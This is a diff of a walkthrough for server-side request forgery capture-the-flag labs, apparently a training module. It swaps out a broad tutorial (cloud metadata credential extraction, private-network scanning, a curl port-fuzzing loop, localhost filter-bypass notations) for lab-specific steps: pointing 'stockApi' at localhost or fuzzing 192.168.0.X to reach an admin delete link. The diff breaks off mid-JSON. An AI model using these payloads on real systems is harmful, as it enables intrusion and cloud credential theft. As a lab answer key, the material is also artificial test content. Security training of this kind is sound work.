@@ -4,33 +4,33 @@
 
 **Company**: CloudStock Marketplace  
 **Role**: Security Researcher  
-**Date**: Q2 2024  
+**Date**: Q2 2026  
 **Severity**: CRITICAL ⚠️
 
 ---
 
 ## Executive Summary
 
-CloudStock Marketplace has deployed a new "Stock Availability Checker" feature that queries internal backend services to provide real-time inventory status. The feature integrates with a supposedly isolated internal API (`http://localhost:8080`), but security assessments have revealed critical vulnerabilities in how server-side requests are processed.
+CloudStock Marketplace Module 4 contains two active SSRF challenge tracks:
 
-Your task is to **investigate and exploit SSRF vulnerabilities** to access restricted admin panels and internal services that should never be exposed to external requests.
+- **Lab 4.1: Internal Loopback Access** (localhost admin pivot)
+- **Lab 4.2: Back-end Discovery** (blind scan of `192.168.0.0/24`)
+
+All sub-labs use a vulnerable server-side stock checker that trusts a user-controlled URL parameter (`stockApi`) and performs requests on behalf of the server.
+
+Your task is to **exploit SSRF in each variant** to reach hidden admin interfaces and trigger the delete action for `carlos`.
 
 ---
 
 ## Business Problem
 
-The development team implemented a stock checking feature without proper input validation on URLs. External users can potentially manipulate API requests to reach internal services, including:
-
-- Admin control panels
-- Internal management interfaces
-- Metadata endpoints
-- Protected configuration services
+The application accepts user-supplied stock endpoint URLs and dispatches them server-side. This allows attackers to pivot from public pages into internal routes.
 
 ### Current Implementation Issues:
-1. **No URL whitelist validation** - Server accepts any URL parameter
-2. **No request origin verification** - External users can trigger internal requests
-3. **No rate limiting on internal services** - Admin operations can be abused
-4. **Insufficient logging** - Internal access patterns not properly monitored
+1. **No strict URL destination allowlist** - user controls `stockApi`
+2. **Server-side internal dispatch exists** - internal paths are reachable from user input
+3. **Admin actions exposed behind network trust assumptions** - `localhost` and private subnet are trusted
+4. **Sensitive operations tied to predictable admin paths** - `/admin` and `/admin/delete?username=...`
 
 ---
 
@@ -38,427 +38,301 @@ The development team implemented a stock checking feature without proper input v
 
 ### Problem Statement
 
-The Stock API has an endpoint `/api/check-stock` that accepts a `supplier_url` parameter. Testing indicates the server-side code makes HTTP requests to whatever URL is provided.
+Lab 4.1 variants are storefront-themed systems where the product detail page sends a POST request with `stockApi`. If you tamper `stockApi` to point at `http://localhost/admin`, the server returns internal admin HTML.
 
-**Initial Reconnaissance:**
-```
-GET /api/check-stock?supplier_url=http://example.com/inventory
-```
-
-This would normally check an external supplier's inventory. However, what if you could make it check an *internal* URL instead?
+From that HTML, extract and replay the delete endpoint for `carlos`.
 
 ---
 
-## Variant 4.1 A: Unprotected Admin Panel on Localhost
+## Variant 4.1 A: Retail Store (Loopback Admin Access)
 
 ### Problem Statement
-Developers assumed the admin panel at `http://localhost/admin` is safe because it's on localhost. They never implement authentication or network isolation, trusting that external users can't reach it. However, SSRF in the stock API lets you make the SERVER request localhost URLs.
+**Theme**: Retail Store (Variation A)  
+The retail stock checker trusts `stockApi` and can be redirected to localhost admin endpoints.
 
 ### Vulnerability Description
-The server-side stock checker makes HTTP requests without validating the URL destination. No allowlist exists for safe domains. The admin panel is directly accessible from localhost with NO authentication.
+The backend accepts `stockApi` and dispatches internal requests when host patterns match local/internal targets. The admin panel includes a delete link for `carlos`.
 
-```
-POST /api/check-stock
-{"supplier_url": "http://localhost/admin"}
-```
-Returns the full HTML of the admin panel, including user deletion links.
-
-### Attack Steps
-1. **Identify endpoint**: `/api/check-stock` or `/api/stock`
-2. **Test parameter**: Try `supplier_url=http://example.com`
-3. **Pivot to localhost**: Change to `http://localhost/admin`
-4. **Observe response**: HTML of admin panel returned
-5. **Extract admin URL**: Look for delete links in HTML
-6. **Find carlos delete**: Pattern like `/admin/delete?user=carlos`
-7. **Submit**: Post the delete URL
+### Attack Steps (Specific to 4.1.A)
+1. Open `Lab 4.1.A` product page (`/lab4/1/a/product/<id>`).
+2. Intercept the stock request to `/lab4/1/a/stock`.
+3. Replace form value `stockApi` with:
+   ```
+   http://localhost/admin
+   ```
+4. Replay and capture returned admin HTML.
+5. Extract the delete URL shown in the response:
+   ```
+   http://localhost/admin/delete?username=carlos
+   ```
+6. Submit that URL again through `/lab4/1/a/stock` as `stockApi`.
+7. Capture success response with generated flag.
 
 ### Payload
 ```
-supplier_url=http://localhost/admin
+stockApi=http://localhost/admin
 ```
 
 ### Expected Response
 ```html
-<h1>Admin Panel</h1>
-<table>
-  <tr><td>carlos</td><td><a href="/admin/delete?user=carlos">Delete</a></td></tr>
-  ...
-</table>
-```
-
-### Flag Endpoint
-```
-After successful SSRF deletion:
-GET /admin/delete?user=carlos
-Response: {"status": "deleted", "flag": "FLAG!lab4_1a_..."}
+<h1>Internal User Management Console</h1>
+...
+<a href="http://localhost/admin/delete?username=carlos">Delete</a>
 ```
 
 ### Why It Works
-- Server trusts localhost implicitly
-- No URL validation on supplier parameter
-- Direct file system access from response
-
-### Tools
-```
-curl -X POST http://target/api/check-stock \
-  -H "Content-Type: application/json" \
-  -d '{"supplier_url":"http://localhost/admin"}'
-```
+- Server performs request on attacker-controlled URL
+- `localhost` is treated as trusted internal destination
+- Admin action endpoint is exposed in returned HTML
 
 ---
 
-## Variant 4.1 B: Hidden Internal Services on Non-Standard Ports
+## Variant 4.1 B: Cloud Infrastructure (Loopback Admin Access)
 
-### Problem Statement  
-The application has multiple internal services running on different ports (8080, 3000, 5000) that are supposed to be invisible. Developers thought port obscurity provides security. Each port runs a different internal service with different functionality and data. SSRF lets you discover and access all of them without knowing they exist.
+### Problem Statement
+**Theme**: Cloud Infrastructure (Variation B)  
+Same SSRF primitive as 4.1.A, different storefront branding and stock source domain.
 
 ### Vulnerability Description
-No port range restrictions exist. You can enumerate various ports through SSRF and discover what's running internally. Services like internal APIs, dashboards, and configuration tools are exposed without any access control.
+Default request uses cloud-themed stock host, but `stockApi` can still be replaced with `http://localhost/admin` and replayed.
 
-### Attack Steps
-1. **Try localhost variations**:
-   - `http://localhost/admin`
-   - `http://127.0.0.1/admin`
-   - `http://0.0.0.0/admin`
-   
-2. **Enumerate ports**:
-   - `http://localhost:8080/`
-   - `http://localhost:3000/`
-   - `http://localhost:5000/`
-
-3. **Analyze responses** - See which ports are active
-
-4. **Find admin interface** on different port
-
-5. **Exploit** with discovered service
+### Attack Steps (Specific to 4.1.B)
+1. Open `/lab4/1/b/product/<id>`.
+2. Intercept POST to `/lab4/1/b/stock`.
+3. Change `stockApi` from the default domain to:
+   ```
+   http://localhost/admin
+   ```
+4. Replay and inspect HTML for delete action.
+5. Set `stockApi` to:
+   ```
+   http://localhost/admin/delete?username=carlos
+   ```
+6. Replay through `/lab4/1/b/stock` and collect flag.
 
 ### Payload Variations
 ```
-supplier_url=http://127.0.0.1/admin
-supplier_url=http://localhost:8080/
-supplier_url=http://0.0.0.0/admin?debug=1
+stockApi=http://localhost/admin
+stockApi=http://127.0.0.1/admin
 ```
 
 ### Expected Findings
 ```json
 {
-  "localhost:80": "Main application",
-  "localhost:8080": "Admin panel",
-  "127.0.0.1:3000": "Internal API",
-  "localhost:5000": "Configuration service"
+  "theme": "Cloud Infrastructure",
+  "entry_point": "/lab4/1/b/stock",
+  "admin_panel": "http://localhost/admin",
+  "delete_endpoint": "http://localhost/admin/delete?username=carlos"
 }
 ```
 
-### Why Different IPs/Ports
-- Service might be on 127.0.0.1 only (not 0.0.0.0)
-- Different ports for different services
-- Port variation reveals more about infrastructure
-
-### Tools
-```bash
-# Fuzz ports
-for port in 80 3000 5000 8000 8080 8443 9000; do
-  curl "http://target/api?url=http://localhost:$port/"
-done
-```
+### Why It Works
+- `stockApi` is user-controlled
+- Localhost destinations are internally dispatched
+- Delete operation is reachable through SSRF replay
 
 ---
 
-## Variant 4.1 C: Multi-Stage Admin Panel with Tiered Data Exposure
+## Variant 4.1 C: Global Logistics (Loopback Admin Access)
 
 ### Problem Statement
-The admin panel has multiple sub-endpoints (`/admin/users`, `/admin/config`, `/admin/logs`, `/admin/database`) that each expose progressively more sensitive information. Developers built no access control between these paths, assuming they're all "admin-only" and therefore safe. SSRF bypasses this assumption completely, exposing the entire admin structure including configuration and system logs.
+**Theme**: Global Logistics (Variation C)  
+The logistics stock checker follows the same vulnerable design and can be abused to access localhost admin paths.
 
 ### Vulnerability Description
-Each admin path leaks different sensitive data. `/admin/config` contains API keys, `/admin/logs` reveals system behavior, `/admin/database` shows query patterns. Following the path chain through SSRF reveals the full infrastructure.
+Attack flow is identical to A/B; only the user-facing theme and default stock domain differ.
 
-### Attack Steps
-1. **Find admin panel** (as in 4.1A)
-2. **Enumerate paths**:
-   - `/admin/delete`
-   - `/admin/users`
-   - `/admin/config`
-   - `/admin/logs`
-   - `/admin/database`
-
-3. **Find data leakage** in different paths
-4. **Extract sensitive info** before executing deletion
-5. **Claim flag** from enhanced response
+### Attack Steps (Specific to 4.1.C)
+1. Open `/lab4/1/c/product/<id>`.
+2. Intercept POST to `/lab4/1/c/stock`.
+3. Replace `stockApi` with:
+   ```
+   http://localhost/admin
+   ```
+4. Replay and extract delete URL from admin response.
+5. Submit:
+   ```
+   http://localhost/admin/delete?username=carlos
+   ```
+   through `/lab4/1/c/stock`.
+6. Confirm admin delete success and collect flag.
 
 ### Payload Variations
 ```
-supplier_url=http://localhost/admin/users
-supplier_url=http://localhost/admin/config
-supplier_url=http://localhost/admin/logs
-supplier_url=http://localhost/admin/delete?user=carlos&verbose=1
+stockApi=http://localhost/admin
+stockApi=http://localhost/admin/delete?username=carlos
 ```
 
 ### Expected Path Responses
 ```
-/admin                → Admin panel HTML
-/admin/users          → List of all users with emails
-/admin/delete?user=X  → Delete confirmation/results
-/admin/logs           → System logs (may reveal more)
-/admin/config         → Configuration with secrets
+/admin                                → Internal admin HTML
+/admin/delete?username=carlos         → Delete success + flag
 ```
 
 ### Why It Works
-- Path enumeration reveals more endpoints
-- Server doesn't validate path depth
-- Internal paths have more information
-- No access control on SSRF endpoints
+- SSRF sink directly accepts attacker input
+- Internal-only admin route becomes reachable server-side
+- Administrative action has no secondary authorization control
 
 ---
 
-## Challenge: Lab 4.2 - Advanced SSRF Exploits (Metadata + Geoblock Bypass)
-
-## Challenge: Lab 4.2 - Advanced SSRF Exploits (Metadata + Geoblock Bypass)
+## Challenge: Lab 4.2 - Back-end Discovery (Blind SSRF)
 
 ### Problem Statement
 
-The organization deployed additional internal APIs for cloud metadata and geographic service checks:
+Lab 4.2 simulates blind SSRF against private management hosts. Only one host in `192.168.0.0/24` exposes `/admin` on port `8080` for each variant/session identity.
 
-- **Metadata Service**: `http://169.254.169.254/latest/` (AWS-style metadata)
-- **Geo-blocking Service**: Internal IP range `10.0.0.0/8`
-- **Cost Analysis API**: Internal analytics endpoint
-
-These services were assumed to be unreachable from the public internet, but SSRF allows us to pivot.
+You must find the correct host, then call `/admin/delete?username=carlos` on that same host.
 
 ---
 
-## Variant 4.2 A: Cloud Infrastructure Credential Extraction
+## Variant 4.2 A: Retail Discovery (Arcade Avenue Outfitters)
 
 ### Problem Statement
-The server is deployed on AWS EC2. AWS automatically makes credentials available via the metadata service endpoint (`169.254.169.254`) that any process on the instance can access. Developers never considered that SSRF could reach this endpoint. The credentials in metadata allow full AWS account access.
+**Theme**: Retail Discovery  
+**Persona**: Arcade Avenue Outfitters  
+You receive stock checks via a vulnerable stock gateway and must discover the valid private admin host.
 
 ### Vulnerability Description
-The metadata endpoint exposes IAM role credentials including AccessKeyId, SecretAccessKey, and temporary tokens. These credentials have full permissions to the AWS account and all resources. SSRF combined with metadata access = complete cloud account compromise.
+Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:8080`. `/admin` returns 200 only for the correct X.
 
-### Attack Steps
-1. **Access metadata service**:
+### Attack Steps (Specific to 4.2.A)
+1. Open `/lab4/2/a/product/<id>`.
+2. Intercept POST to `/lab4/2/a/stock`.
+3. Replace `stockApi` path from `/product/stock/check` to:
    ```
-   supplier_url=http://169.254.169.254/latest/
+   http://192.168.0.1:8080/admin
    ```
-
-2. **Get IAM role name**:
+4. Fuzz the last octet (`1-255`) and replay requests.
+5. Identify the one response with `200` and admin HTML.
+6. Use the winning IP and set:
    ```
-   supplier_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
    ```
-
-3. **Extract credentials**:
-   ```
-   supplier_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
-   ```
-
-4. **Analyze response** - Contains AWS access keys
-5. **Use credentials** - Access AWS resources
-6. **Claim flag** - Stored in response
-
-### Expected Metadata Structure
-```
-/latest/meta-data/
-├── ami-id
-├── instance-id
-├── instance-type
-├── iam/
-│   └── security-credentials/
-│       └── [role-name]
-│           ├── AccessKeyId
-│           ├── SecretAccessKey
-│           ├── Token
-│           └── Expiration
-└── user-data/
-```
-
-### Payload Variations
-```
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/meta-data/instance-id
-http://169.254.169.254/latest/meta-data/iam/info
-```
+7. Replay through `/lab4/2/a/stock` and capture flag.
 
 ### Expected Finding
 ```json
 {
-  "Code": "Success",
-  "LastUpdated": "2024-04-09T12:00:00Z",
-  "Type": "AWS-HMAC",
-  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
-  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-  "Token": "...",
-  "Expiration": "2024-04-09T18:00:00Z"
+  "variant": "4.2.A",
+  "network": "192.168.0.0/24",
+  "admin_port": 8080,
+  "signal": "Single host returns 200 on /admin"
 }
 ```
 
 ### Why It Works
-- Metadata endpoint is not restricted
-- No origin validation on SSRF requests
-- AWS credentials are in plain JSON
-- Can be used to access AWS resources
+- Blind SSRF sink reveals success/failure via status/content
+- Private host trust assumption is exploitable
+- Admin delete path is exposed once host is discovered
 
 ---
 
-## Variant 4.2 B: Private Network Segmentation Bypass
+## Variant 4.2 B: Cloud Discovery (Nimbus Compute Marketplace)
 
 ### Problem Statement
-The infrastructure has internal services (database, cache, monitoring) on private IPs (10.0.0.0/8 range) that are blocked by firewall from external access. These services trust all traffic from internal network without authentication. SSRF lets you bypass the firewall entirely because requests originate from the internal server, not external internet.
+**Theme**: Cloud Discovery  
+**Persona**: Nimbus Compute Marketplace  
+The vulnerable stock checker can be transformed into an internal admin host scanner.
 
 ### Vulnerability Description
-Database, cache, and configuration services are isolated on private IP ranges. Firewalls block external access. BUT the web server making SSRF requests is internal, so responses come from a trusted source. No authentication required on internal services, they assume network isolation is enough.
+Route behavior mirrors 4.2.A, but under the cloud variant context and its own flag mapping.
 
-### Attack Steps
-1. **Target internal IP range**:
-   - `10.0.0.0/8` (Private network)
-   - `172.16.0.0/12` (Private)
-   - `192.168.0.0/16` (Private)
-
-2. **Enumerate internal hosts**:
+### Attack Steps (Specific to 4.2.B)
+1. Open `/lab4/2/b/product/<id>`.
+2. Intercept `/lab4/2/b/stock` request.
+3. Set `stockApi` to:
    ```
-   supplier_url=http://10.0.0.1/
-   supplier_url=http://10.0.0.100/
-   supplier_url=http://10.0.0.200/admin
+   http://192.168.0.1:8080/admin
    ```
-
-3. **Identify active services** based on responses
-
-4. **Access restricted services** that reject external access
+4. Brute-force octet 1-255 until admin HTML appears.
+5. Replay delete action on discovered host:
    ```
-   supplier_url=http://10.0.1.50:8080/internal-api
+   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
    ```
-
-5. **Extract flag** from internal service
-
-### Target Services Within IP Range
-```
-10.0.0.1        → Router/Gateway
-10.0.0.50       → Database server
-10.0.1.100      → Cache server (Redis/Memcached)
-10.0.2.20       → Internal monitoring
-10.0.3.80       → Internal API gateway
-192.168.1.100   → Admin dashboard
-```
+6. Capture flag from success response.
 
 ### Payload Variations
 ```
-http://10.0.0.50:3306/  (MySQL port try)
-http://10.0.1.100:6379/ (Redis port)
-http://10.0.2.20:9200/  (Elasticsearch)
-http://192.168.1.1/admin (Router admin)
+stockApi=http://192.168.0.42:8080/admin
+stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
 ```
 
 ### Expected Findings
-```
-10.0.0.50:3306   → Database connection string/version
-10.0.1.100:6379  → Redis info (keys, memory usage)
-10.0.2.20:9200   → Elasticsearch indices, data
-10.0.3.80        → Internal API documentation
+```json
+{
+  "variant": "4.2.B",
+  "persona": "Nimbus Compute Marketplace",
+  "technique": "Blind SSRF host discovery + action replay"
+}
 ```
 
 ### Why It Works
-- Firewall allows server→internal traffic
-- External access to private range is blocked
-- SSRF bypasses source IP validation
-- Internal services trust internal requests
+- Server requests attacker-provided private IP targets
+- Only one target host serves admin content
+- Same host accepts delete action for `carlos`
 
 ---
 
-## Variant 4.2 C: Service Registry Enumeration and Escalation
+## Variant 4.2 C: Logistics Discovery (Portline Freight Systems)
 
 ### Problem Statement
-The infrastructure uses a service registry (API gateway at localhost:8080) that returns a list of all internal services. This registry is supposed to be admin-only but has no authentication. Once you discover the service list via SSRF, you can chain requests to each service. Some services (auth-service) have elevated privileges that let you get tokens for other services (admin-service). One SSRF entry point becomes unlimited internal access.
+**Theme**: Logistics Discovery  
+**Persona**: Portline Freight Systems  
+You must identify the hidden operations admin host on the private range and execute the delete action.
 
 ### Vulnerability Description
-SSRF to registry → see all services → SSRF to auth-service → get admin token → SSRF to admin-service with token → extract secrets. The vulnerability multiplies through chaining because service-to-service communication is fully trusted.
+Blind SSRF response behavior leaks whether a private host/path is valid. Admin endpoint and delete action are reachable on the discovered host.
 
-### Attack Steps
-1. **Find API gateway** (usually at internal address):
+### Attack Steps (Specific to 4.2.C)
+1. Open `/lab4/2/c/product/<id>`.
+2. Intercept POST to `/lab4/2/c/stock`.
+3. Change `stockApi` to admin probe URL:
    ```
-   supplier_url=http://localhost:8080/services
+   http://192.168.0.1:8080/admin
    ```
-
-2. **Get service list** from gateway response:
+4. Fuzz final octet and observe responses.
+5. Keep the host returning admin interface.
+6. Submit delete URL on same host:
    ```
-   Response shows: auth-service, payment-service, user-service, admin-service
+   http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
    ```
-
-3. **Access discovered services**:
-   ```
-   supplier_url=http://localhost:8080/auth-service/admin
-   supplier_url=http://localhost:8080/user-service/all-users
-   supplier_url=http://localhost:8080/admin-service/config
-   ```
-
-4. **Exploit specific service** with admin access
-5. **Extract sensitive data** from chained requests
-6. **Claim flag** with escalated access
-
-### Service Discovery Patterns
-```
-/services/list
-/api/v1/services
-/actuator/health (Spring Boot)
-/healthz (Kubernetes)
-/.well-known/services
-/admin/status
-/internal/status
-```
-
-### Payload Variations - Accessing Different Services
-```
-supplier_url=http://localhost:8080/api/auth-service/admin
-supplier_url=http://localhost:8080/api/payment-service/transactions?limit=1000
-supplier_url=http://localhost:8080/api/user-service/export?format=csv
-supplier_url=http://localhost:8080/api/admin-service/backup/download
-```
+7. Collect flag from successful administrative action response.
 
 ### Expected Chained Exploitation
 ```
-SSRF Request 1 → Discover services
-SSRF Request 2 → Access auth-service → Get admin token
-SSRF Request 3 → Use token with admin-service → Access secrets
-SSRF Request 4 → Download configuration → Find credentials
+SSRF request to /admin probe
+→ identify valid internal host
+→ SSRF request to /admin/delete?username=carlos
+→ receive flag
 ```
 
 ### Why It's Powerful
-- One vulnerability leads to multiple services
-- Service discovery reveals architecture
-- Token/auth reuse across services
-- Admin access in one = access to all
-- Chained requests multiply impact
+- Blind SSRF can still fully compromise internal operations paths
+- Status/content differences are enough for discovery
+- One SSRF sink enables internal admin action execution
 
 ---
 
-## Common SSRF Bypass Techniques Used in Lab 4.2
+## Common SSRF Bypass Techniques Used in Lab 4
 
-### If Direct Localhost Blocked
+### For Lab 4.1 Loopback Pivot
 ```
-http://127.0.0.1:80     → bypass "localhost" filter
-http://0.0.0.0:80       → alternate representation
-http://localhost:80     → case variation
-http://LOCALHOST        → uppercase
-http://127.1            → shortened notation
-http://2130706433       → decimal notation (127.0.0.1)
+http://localhost/admin
+http://127.0.0.1/admin
 ```
 
-### If Certain Ports Blocked
+### For Lab 4.2 Private Host Discovery
 ```
-supplier_url=http://localhost:8080
-supplier_url=http://localhost:3000
-supplier_url=http://localhost:5000
-[Try non-standard ports for internal services]
+http://192.168.0.X:8080/admin
+http://192.168.0.X:8080/admin/delete?username=carlos
 ```
 
-### If URL Starts with Validation
+### Notes on This Module
 ```
-Filter: Rejects URLs starting with "http://"
-Bypass: Use "HTTP://" (case variation)
-
-Filter: Rejects "localhost"
-Bypass: Use "127.0.0.1"
-
-Filter: Requires domain
-Bypass: Use domain redirect that points to localhost
+- Lab 4.2 expects private host format 192.168.0.X only
+- Port must be 8080 for admin responses
+- Success is host-specific per variant/session identity
 ```
 
 ---
@@ -466,15 +340,15 @@ Bypass: Use domain redirect that points to localhost
 ## Lab 4 Complete Variant Map
 
 ```
-Lab 4.1 (Loopback Admin Access)
-├─ Variant A: Basic localhost admin panel access
-├─ Variant B: Port/IP enumeration (find alternate services)
-└─ Variant C: Path traversal within admin endpoints
+Lab 4.1 (Internal Loopback Access)
+├─ Variant A: Retail Store
+├─ Variant B: Cloud Infrastructure
+└─ Variant C: Global Logistics
 
-Lab 4.2 (Advanced + Metadata)
-├─ Variant A: AWS metadata extraction (credentials)
-├─ Variant B: Private IP range access (geoblock bypass) 
-└─ Variant C: Service discovery + chained exploitation
+Lab 4.2 (Back-end Discovery)
+├─ Variant A: Retail Discovery (Arcade Avenue Outfitters)
+├─ Variant B: Cloud Discovery (Nimbus Compute Marketplace)
+└─ Variant C: Logistics Discovery (Portline Freight Systems)
 ```
 
 ---
@@ -483,192 +357,137 @@ Lab 4.2 (Advanced + Metadata)
 
 ### Phase 1: Reconnaissance (All Variants)
 ```
-1. Identify parameter: supplier_url / url / endpoint
-2. Test with external: http://example.com
-3. Confirm SSRF: http://localhost vs error message
+1. Open a product detail page in the target variant
+2. Trigger "Check Stock"
+3. Intercept POST request containing stockApi
 ```
 
 ### Phase 2: Variant-Specific Exploitation
 
-**Variants 4.1 A-C Path:**
+**Lab 4.1 A-C Path:**
 ```
-4. Access localhost/admin
-5. Extract HTML structure
-6. Find admin operations
-7. Execute specific operation
-8. Retrieve flag
+4. Set stockApi=http://localhost/admin
+5. Replay and read admin HTML
+6. Extract /admin/delete?username=carlos URL
+7. Replay delete URL via same /lab4/1/*/stock endpoint
+8. Capture flag
 ```
 
-**Variants 4.2 A-C Path:**
+**Lab 4.2 A-C Path:**
 ```
-4. Try metadata (169.254...)
-5. Enumerate IP ranges (10.0.0.0...)
-6. Find services (8080, 3000...)
-7. Chain requests for escalation
-8. Retrieve credentials/secrets
-9. Retrieve flag
+4. Set stockApi=http://192.168.0.1:8080/admin
+5. Brute-force last octet 1..255
+6. Identify host that returns admin HTML (200)
+7. Replay /admin/delete?username=carlos on that host
+8. Capture flag
 ```
 
 ---
-
-## Expected Discoveries Across All Variants
 
 ## Expected Discoveries Across All Variants
 
 ### Lab 4.1 A Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "Direct SSRF - Localhost Access",
-  "entry_point": "supplier_url parameter",
-  "attack_flow": "External → SSRF endpoint → Localhost admin panel",
-  "admin_panel_found": "http://localhost/admin",
-  "delete_endpoint": "/admin/delete?user=carlos",
-  "exploitation_method": "SSRF via supplier_url parameter",
-  "result": "User carlos deleted successfully",
-  "flag_format": "FLAG!lab4_1a_[hash]"
+  "theme": "Retail Store",
+  "entry_point": "/lab4/1/a/stock",
+  "payload_1": "http://localhost/admin",
+  "payload_2": "http://localhost/admin/delete?username=carlos",
+  "result": "User carlos deleted",
+  "flag_format": "FLAG{lab4_variation_A_[hash12]}"
 }
 ```
 
 ### Lab 4.1 B Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "Port enumeration via SSRF",
-  "services_discovered": {
-    "localhost:80": "Main web application",
-    "localhost:8080": "Admin panel (alternate port)",
-    "localhost:3000": "API service (maybe)",
-    "127.0.0.1:5000": "Configuration service"
-  },
-  "multiple_entry_points": true,
-  "exploitation_method": "SSRF with port fuzzing",
-  "result": "Access to hidden services on different ports",
-  "flag_format": "FLAG!lab4_1b_[hash]"
+  "theme": "Cloud Infrastructure",
+  "entry_point": "/lab4/1/b/stock",
+  "payload_1": "http://localhost/admin",
+  "payload_2": "http://localhost/admin/delete?username=carlos",
+  "result": "User carlos deleted",
+  "flag_format": "FLAG{lab4_variation_B_[hash12]}"
 }
 ```
 
 ### Lab 4.1 C Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "Path traversal + SSRF combination",
-  "admin_paths_found": [
-    "/admin/users",
-    "/admin/delete",
-    "/admin/config",
-    "/admin/logs",
-    "/admin/database"
-  ],
-  "data_exposed": "Configuration, logs, user list, database info",
-  "escalation": "From basic delete to config/secrets exposure",
-  "exploitation_method": "SSRF + path enumeration",
-  "flag_format": "FLAG!lab4_1c_[hash]"
+  "theme": "Global Logistics",
+  "entry_point": "/lab4/1/c/stock",
+  "payload_1": "http://localhost/admin",
+  "payload_2": "http://localhost/admin/delete?username=carlos",
+  "result": "User carlos deleted",
+  "flag_format": "FLAG{lab4_variation_C_[hash12]}"
 }
 ```
 
 ### Lab 4.2 A Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "AWS metadata extraction via SSRF",
-  "metadata_endpoint": "http://169.254.169.254/latest/",
-  "credential_extracted": true,
-  "extracted_credentials": {
-    "AccessKeyId": "AKIA...",
-    "SecretAccessKey": "...",
-    "Token": "...",
-    "Expiration": "..."
-  },
-  "impact": "Full AWS account access with extracted credentials",
-  "exploitation_method": "SSRF to metadata endpoint",
-  "flag_format": "FLAG!lab4_2a_[hash]"
+  "theme": "Retail Discovery",
+  "persona": "Arcade Avenue Outfitters",
+  "entry_point": "/lab4/2/a/stock",
+  "scan_space": "192.168.0.0/24",
+  "admin_path": "/admin",
+  "delete_path": "/admin/delete?username=carlos",
+  "flag_format": "FLAG{lab4_variation_A_[hash12]}"
 }
 ```
 
 ### Lab 4.2 B Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "Private IP range access via SSRF",
-  "geoblock_bypass": true,
-  "internal_ips_accessed": [
-    "10.0.0.50",
-    "10.0.1.100", 
-    "192.168.1.1"
-  ],
-  "services_found": [
-    "Database (10.0.0.50:3306)",
-    "Cache (10.0.1.100:6379)",
-    "Admin dashboard (192.168.1.1)"
-  ],
-  "data_leaked": "Service banners, configurations, connection details",
-  "exploitation_method": "SSRF to private IP range",
-  "flag_format": "FLAG!lab4_2b_[hash]"
+  "theme": "Cloud Discovery",
+  "persona": "Nimbus Compute Marketplace",
+  "entry_point": "/lab4/2/b/stock",
+  "scan_space": "192.168.0.0/24",
+  "admin_path": "/admin",
+  "delete_path": "/admin/delete?username=carlos",
+  "flag_format": "FLAG{lab4_variation_B_[hash12]}"
 }
 ```
 
 ### Lab 4.2 C Expected Discoveries:
 ```json
 {
-  "vulnerability_type": "Chained SSRF + service discovery",
-  "service_discovery": true,
-  "services_enumerated": [
-    "auth-service",
-    "payment-service",
-    "user-service",
-    "admin-service"
-  ],
-  "attack_chain": [
-    "SSRF to service registry",
-    "Discover all internal services",
-    "SSRF to each service",
-    "Elevate privileges via auth-service",
-    "Access admin-service with elevated token",
-    "Download config/secrets"
-  ],
-  "escalation_achieved": true,
-  "exploitation_method": "Multi-step SSRF with chaining",
-  "flag_format": "FLAG!lab4_2c_[hash]"
+  "theme": "Logistics Discovery",
+  "persona": "Portline Freight Systems",
+  "entry_point": "/lab4/2/c/stock",
+  "scan_space": "192.168.0.0/24",
+  "admin_path": "/admin",
+  "delete_path": "/admin/delete?username=carlos",
+  "flag_format": "FLAG{lab4_variation_C_[hash12]}"
 }
 ```
 
 ---
 
 ## Step-by-Step General Exploitation Guide
-```
-Test with a known internal address:
-POST /api/check-stock HTTP/1.1
-Content-Type: application/json
 
-{"supplier_url": "http://localhost/admin"}
+### Step 1: Capture Stock Request
 ```
+POST /lab4/<sub-lab>/.../stock
+Content-Type: application/x-www-form-urlencoded
 
-### Step 2: Analyze the Response
-- Look for HTML content from internal pages
-- Check response headers for location/redirect info
-- Note any error messages revealing internal structure
-
-### Step 3: Enumerate Internal Services
-```
-Try these common internal endpoints:
-- http://localhost:80
-- http://localhost:8080
-- http://localhost:3000
-- http://127.0.0.1/admin
-- http://169.254.169.254/ (metalink)
+stockApi=http://<default-stock-host>/stock/check?... 
 ```
 
-### Step 4: Extract Admin Links
-Once you reach `/admin`:
-- View page source (in response body)
-- Find `<a>` tags with href attributes
-- Look for pattern like `/admin/delete?user=carlos`
+### Step 2: Tamper `stockApi`
+- Lab 4.1: switch to `http://localhost/admin`
+- Lab 4.2: switch to `http://192.168.0.X:8080/admin`
 
-### Step 5: Exploit the Vulnerability
+### Step 3: Replay and Observe
+- Look for admin HTML (`200`) vs not found (`404`)
+- Identify correct target host/path
+
+### Step 4: Execute Delete Action
 ```
-Submit the admin delete URL:
-POST /api/check-stock HTTP/1.1
-{"supplier_url": "http://localhost/admin/delete?user=carlos"}
+http://<target>/admin/delete?username=carlos
 ```
 
-### Step 6: Claim Flag
-The response should contain a flag string. Extract and submit it.
+### Step 5: Claim Flag
+Extract the flag shown in the success response and submit.
 
 ---
 
@@ -677,22 +496,20 @@ The response should contain a flag string. Extract and submit it.
 ### Lab 4.1 Expected Discoveries:
 ```json
 {
-  "admin_panel_found": "http://localhost/admin",
-  "delete_endpoint": "/admin/delete?user=carlos",
-  "exploitation_method": "SSRF via supplier_url parameter",
-  "result": "User carlos deleted successfully",
-  "flag_format": "FLAG!lab4_1_[hash]"
+  "objective": "Loopback admin pivot",
+  "working_payload": "http://localhost/admin",
+  "delete_endpoint": "http://localhost/admin/delete?username=carlos",
+  "result": "Admin action executed via SSRF"
 }
 ```
 
 ### Lab 4.2 Expected Discoveries:
 ```json
 {
-  "metadata_service": "http://localhost:8080/metadata",
-  "bypass_technique": "URL encoding or scheme variations",
